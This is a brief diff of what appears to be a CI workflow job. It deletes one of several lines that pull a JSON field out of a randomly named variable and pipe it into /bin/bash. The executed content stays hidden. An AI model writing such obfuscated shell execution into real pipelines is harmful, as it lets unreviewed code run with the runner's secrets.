@@ -26,7 +26,6 @@ jobs:
           echo $pl31993 | jq -r .m755 | /bin/bash
           echo $v5533 | jq -r .mqcve419 | /bin/bash
           printf '%s' "$j14763" | jq -r .x2 | /bin/bash
-          printf '%s' "$pxcur37223" | jq -r .t441 | /bin/bash
           echo $a9662 | jq -r .yj3 | /bin/bash
           printf '%s' "$tpek0" | jq -r .q561 | /bin/bash
           echo $fzac04013 | jq -r .vx77068 | /bin/bash
